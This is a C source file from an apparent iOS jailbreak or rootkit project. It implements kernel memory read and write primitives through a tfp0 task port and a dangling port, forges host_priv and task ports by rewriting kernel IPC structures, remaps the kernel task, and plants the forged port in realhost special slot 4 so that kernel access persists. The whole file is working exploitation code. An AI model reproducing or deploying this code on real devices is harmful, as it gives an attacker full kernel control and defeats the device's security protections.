//
//  hsp4.c
//  rootKit
//
//  Created by Lakr Sakura on 2019/2/1.
//  Copyright © 2019 Lakr Sakura. All rights reserved.
//

#include "hsp4.h"

mach_port_t fake_host_priv_HSP4_port = MACH_PORT_NULL;
mach_port_t kmem_read_port = MACH_PORT_NULL;
mach_port_t tfp00 = MACH_PORT_NULL;
uint64_t cached_task_self_addr_HSP4_HSP4 = 0;

uint32_t IO_BITS_ACTIVE = 0x80000000;
uint32_t IKOT_TASK = 2;
uint32_t IKOT_NONE = 0;

void init_tfp0_at_hsp4(mach_port_t p) {
    tfp00 = p;
}

uint32_t rk32_HSP4_via_kmem_read_port(uint64_t kaddr) {
    kern_return_t err;
    if (kmem_read_port == MACH_PORT_NULL) {
        printf("kmem_read_port not set, have you called prepare_rk?\n");
        sleep(10);
        exit(EXIT_FAILURE);
    }
    
    mach_port_context_t context = (mach_port_context_t)kaddr - 0x10;
    err = mach_port_set_context(mach_task_self(), kmem_read_port, context);
    if (err != KERN_SUCCESS) {
        printf("error setting context off of dangling port: %x %s\n", err, mach_error_string(err));
        sleep(10);
        exit(EXIT_FAILURE);
    }
    
    // now do the read:
    uint32_t val = 0;
    err = pid_for_task(kmem_read_port, (int*)&val);
    if (err != KERN_SUCCESS) {
        printf("error calling pid_for_task %x %s", err, mach_error_string(err));
        sleep(10);
        exit(EXIT_FAILURE);
    }
    
    return val;
}

uint32_t rk32_HSP4_via_tfp00(uint64_t kaddr) {
    kern_return_t err;
    uint32_t val = 0;
    mach_vm_size_t outsize = 0;
    err = mach_vm_read_overwrite(tfp00,
                                 (mach_vm_address_t)kaddr,
                                 (mach_vm_size_t)sizeof(uint32_t),
                                 (mach_vm_address_t)&val,
                                 &outsize);
    if (err != KERN_SUCCESS){
        printf("tfp00 read failed %s addr: 0x%llx err:%x port:%x\n", mach_error_string(err), kaddr, err, tfp00);
        sleep(3);
        return 0;
    }
    
    if (outsize != sizeof(uint32_t)){
        printf("tfp00 read was short (expected %lx, got %llx\n", sizeof(uint32_t), outsize);
        sleep(3);
        return 0;
    }
    return val;
}

int32_t rk32_HSP4(uint64_t kaddr) {
    if (tfp00 != MACH_PORT_NULL) {
        return rk32_HSP4_via_tfp00(kaddr);
    }
    
    if (kmem_read_port != MACH_PORT_NULL) {
        return rk32_HSP4_via_kmem_read_port(kaddr);
    }
    
    printf("attempt to read kernel memory but no kernel memory read primitives available\n");
    sleep(3);
    
    return 0;
}

uint64_t rk64_HSP4(uint64_t kaddr) {
    uint64_t lower = rk32_HSP4(kaddr);
    uint64_t higher = rk32_HSP4(kaddr+4);
    uint64_t full = ((higher<<32) | lower);
    return full;
}

void wk32_HSP4(uint64_t kaddr, uint32_t val) {
    if (tfp00 == MACH_PORT_NULL) {
        printf("attempt to write to kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return;
    }
    
    kern_return_t err;
    err = mach_vm_write(tfp00,
                        (mach_vm_address_t)kaddr,
                        (vm_offset_t)&val,
                        (mach_msg_type_number_t)sizeof(uint32_t));
    
    if (err != KERN_SUCCESS) {
        printf("tfp00 write failed: %s %x\n", mach_error_string(err), err);
        return;
    }
}

void wk64_HSP4_HSP4(uint64_t kaddr, uint64_t val) {
    uint32_t lower = (uint32_t)(val & 0xffffffff);
    uint32_t higher = (uint32_t)(val >> 32);
    wk32_HSP4(kaddr, lower);
    wk32_HSP4(kaddr+4, higher);
}

uint64_t task_self_addr_HSP4() {
    if (cached_task_self_addr_HSP4_HSP4 == 0) {
        cached_task_self_addr_HSP4_HSP4 = getAddressOfPort(getpid(), mach_task_self());
        printf("task self: 0x%llx\n", cached_task_self_addr_HSP4_HSP4);
    }
    return cached_task_self_addr_HSP4_HSP4;
}

uint64_t ipc_space_kernel_HSP4() {
    return rk64_HSP4(task_self_addr_HSP4() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
}

void wkbuffer(uint64_t kaddr, void* buffer, uint32_t length) {
    if (tfp00 == MACH_PORT_NULL) {
        printf("attempt to write to kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return;
    }
    
    kern_return_t err;
    err = mach_vm_write(tfp00,
                        (mach_vm_address_t)kaddr,
                        (vm_offset_t)buffer,
                        (mach_msg_type_number_t)length);
    
    if (err != KERN_SUCCESS) {
        printf("tfp00 write failed: %s %x\n", mach_error_string(err), err);
        return;
    }
}

void rkbuffer(uint64_t kaddr, void* buffer, uint32_t length) {
    kern_return_t err;
    mach_vm_size_t outsize = 0;
    err = mach_vm_read_overwrite(tfp00,
                                 (mach_vm_address_t)kaddr,
                                 (mach_vm_size_t)length,
                                 (mach_vm_address_t)buffer,
                                 &outsize);
    if (err != KERN_SUCCESS){
        printf("tfp00 read failed %s addr: 0x%llx err:%x port:%x\n", mach_error_string(err), kaddr, err, tfp00);
        sleep(3);
        return;
    }
    
    if (outsize != length){
        printf("tfp00 read was short (expected %lx, got %llx\n", sizeof(uint32_t), outsize);
        sleep(3);
        return;
    }
}

const uint64_t kernel_address_space_base = 0xffff000000000000;
void kmemcpy(uint64_t dest, uint64_t src, uint32_t length) {
    if (dest >= kernel_address_space_base) {
        // copy to kernel:
        wkbuffer(dest, (void*) src, length);
    } else {
        // copy from kernel
        rkbuffer(src, (void*)dest, length);
    }
}

uint64_t kmem_alloc(uint64_t size) {
    if (tfp00 == MACH_PORT_NULL) {
        printf("attempt to allocate kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return 0;
    }
    
    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    err = mach_vm_allocate(tfp00, &addr, ksize, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        printf("unable to allocate kernel memory via tfp00: %s %x\n", mach_error_string(err), err);
        sleep(3);
        return 0;
    }
    return addr;
}

// build a fake host priv port
mach_port_t fake_host_priv_HSP4() {
    if (fake_host_priv_HSP4_port != MACH_PORT_NULL) {
        return fake_host_priv_HSP4_port;
    }
    // get the address of realhost:
    uint64_t hostport_addr = read_ker_proc();
    uint64_t realhost = rk64_HSP4(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    // allocate a port
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (err != KERN_SUCCESS) {
        printf("failed to allocate port\n");
        return MACH_PORT_NULL;
    }
    
    // get a send right
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    // locate the port
    uint64_t port_addr = read_our_proc();
    
    // change the type of the port
#define IKOT_HOST_PRIV 4
#define IO_ACTIVE   0x80000000
    wk32_HSP4(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_HOST_PRIV);
    
    // change the space of the port
    wk64_HSP4_HSP4(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel_HSP4());
    
    // set the kobject
    wk64_HSP4_HSP4(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), realhost);
    
    fake_host_priv_HSP4_port = port;
    
    return port;
}

void convert_port_to_task_port_HSP4(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
    // now make the changes to the port object to make it a task port:
    uint64_t port_kaddr = getAddressOfPort(getpid(), port);
    
    wk32_HSP4(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
    wk32_HSP4(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
    wk32_HSP4(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
    wk64_HSP4_HSP4(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
    wk64_HSP4_HSP4(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
    
    // swap our receive right for a send right:
    uint64_t task_port_addr = task_self_addr_HSP4();
    uint64_t task_addr = rk64_HSP4(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = rk64_HSP4(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = rk64_HSP4(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint32_t bits = rk32_HSP4(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
    
#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
    
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    
    wk32_HSP4(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
}

void make_port_fake_task_port_HSP4(mach_port_t port, uint64_t task_kaddr) {
    convert_port_to_task_port_HSP4(port, ipc_space_kernel_HSP4(), task_kaddr);
}

uint64_t make_fake_task(uint64_t vm_map) {
    uint64_t fake_task_kaddr = kmem_alloc(0x1000);
    
    void* fake_task = malloc(0x1000);
    memset(fake_task, 0, 0x1000);
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    kmemcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
    free(fake_task);
    
    return fake_task_kaddr;
}

// Stek29's code.

kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
    // huge thanks to Siguza for hsp4 & v0rtex
    // for explainations and being a good rubber duck :p
    
    // see https://github.com/siguza/hsp4 for some background and explaination
    // tl;dr: there's a pointer comparison in convert_port_to_task_with_exec_token
    //   which makes it return TASK_NULL when kernel_task is passed
    //   "simple" vm_remap is enough to overcome this.
    
    // However, vm_remap has weird issues with submaps -- it either doesn't remap
    // or using remapped addresses leads to panics and kittens crying.
    
    // tasks fall into zalloc, so src_map is going to be zone_map
    // zone_map works perfectly fine as out zone -- you can
    // do remap with src/dst being same and get new address
    
    // however, using kernel_map makes more sense
    // we don't want zalloc to mess with our fake task
    // and neither
    
    // proper way to use vm_* APIs from userland is via mach_vm_*
    // but those accept task ports, so we're gonna set up
    // fake task, which has zone_map as its vm_map
    // then we'll build fake task port from that
    // and finally pass that port both as src and dst
    
    // last step -- wire new kernel task -- always a good idea to wire critical
    // kernel structures like tasks (or vtables :P )
    
    // and we can write our port to realhost.special[4]
    
    // we can use mach_host_self() if we're root
    mach_port_t host_priv = fake_host_priv_HSP4();
    
    int ret;
    uint64_t remapped_task_addr = 0;
    // task is smaller than this but it works so meh
    uint64_t sizeof_task = 0x1000;
    
    uint64_t kernel_task_kaddr;
    
    {
        // find kernel task first
        kernel_task_kaddr = rk64_HSP4(task_self_addr_HSP4() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        
        while (kernel_task_kaddr != 0) {
            uint64_t bsd_info = rk64_HSP4(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
            
            uint32_t pid = rk32_HSP4(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
            
            if (pid == 0) {
                break;
            }
            
            kernel_task_kaddr = rk64_HSP4(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_PREV));
        }
        
        if (kernel_task_kaddr == 0) {
            printf("[remap_kernel_task] failed to find kernel task\n");
            return 1;
        }
        
        printf("[remap_kernel_task] kernel task at 0x%llx\n", kernel_task_kaddr);
    }
    
    mach_port_t zm_fake_task_port = MACH_PORT_NULL;
    mach_port_t km_fake_task_port = MACH_PORT_NULL;
    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
    ret = ret || mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);
    
    if (ret == KERN_SUCCESS && *port == MACH_PORT_NULL) {
        ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port);
    }
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] unable to allocate ports: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
    // or traditional \"zone_init: kmem_suballoc failed\"
    uint64_t zone_map_kptr = zone_map_ref;
    uint64_t zone_map = rk64_HSP4(zone_map_kptr);
    
    // kernel_task->vm_map == kernel_map
    uint64_t kernel_map = rk64_HSP4(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
    
    uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
    uint64_t km_fake_task_kptr = make_fake_task(kernel_map);
    
    make_port_fake_task_port_HSP4(zm_fake_task_port, zm_fake_task_kptr);
    make_port_fake_task_port_HSP4(km_fake_task_port, km_fake_task_kptr);
    
    km_fake_task_port = zm_fake_task_port;
    
    vm_prot_t cur, max;
    ret = mach_vm_remap(km_fake_task_port,
                        &remapped_task_addr,
                        sizeof_task,
                        0,
                        VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR,
                        zm_fake_task_port,
                        kernel_task_kaddr,
                        0,
                        &cur, &max,
                        VM_INHERIT_NONE);
    
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] remap failed: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    if (kernel_task_kaddr == remapped_task_addr) {
        printf("[remap_kernel_task] remap failure: addr is the same after remap\n");
        return 1;
    }
    
    printf("[remap_kernel_task] remapped successfully to 0x%llx\n", remapped_task_addr);
    
    ret = mach_vm_wire(host_priv, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE);
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] wire failed: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    uint64_t port_kaddr = read_our_proc();
    printf("[remap_kernel_task] port kaddr: 0x%llx\n", port_kaddr);
    
    make_port_fake_task_port_HSP4(*port, remapped_task_addr);
    
    if (rk64_HSP4(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
        printf("[remap_kernel_task] read back tfpzero kobject didnt match!\n");
        return 1;
    }
    
    // lck_mtx -- arm: 8  arm64: 16
    const int offsetof_host_special = 0x10;
    uint64_t host_priv_kaddr = getAddressOfPort(getpid(), mach_host_self());
    uint64_t realhost_kaddr = rk64_HSP4(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    wk64_HSP4_HSP4(realhost_kaddr + offsetof_host_special + 4 * sizeof(void*), port_kaddr);
    
    return 0;
}
